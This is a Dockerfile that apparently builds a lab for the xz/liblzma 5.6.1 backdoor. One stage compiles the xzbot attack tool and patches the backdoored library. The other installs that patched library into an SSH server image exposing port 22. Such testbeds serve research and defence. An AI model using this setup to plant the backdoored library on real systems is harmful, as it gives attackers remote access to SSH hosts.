# -- Build the patched backdoor
FROM debian:bookworm AS exploit
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -y update && \
    apt -y --no-install-recommends --no-install-suggests install \
    binutils \
    build-essential \
    ca-certificates \
    golang-go \
    python3-pip \
    python3.11-venv \
    tmux \
    unzip \
    vim

RUN mkdir /exploit

COPY xzbot /exploit/xzbot
WORKDIR /exploit/xzbot
RUN go build .

COPY deb/liblzma5_5.6.1-1_amd64.deb /exploit/
COPY patch/ /exploit/patch
RUN dpkg -i /exploit/liblzma5_5.6.1-1_amd64.deb

RUN python3 -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"
RUN pip install -r /exploit/patch/requirements.txt
RUN python3 /exploit/patch/patch.py \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1 | \
    tee /exploit/ed448info.txt

WORKDIR /exploit
CMD ["sleep", "inf"]

# -- Build vulnerable Docker image
FROM debian:bookworm AS vulnerable
ARG DEBIAN_FRONTEND=noninteractive

USER root

RUN apt -y update && \
    apt -y --no-install-recommends --no-install-suggests install \
    openssh-server

COPY deb/liblzma5_5.6.1-1_amd64.deb /
RUN dpkg -i /liblzma5_5.6.1-1_amd64.deb
COPY --from=exploit \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.patch \
    /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

RUN mkdir -p /var/run/sshd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
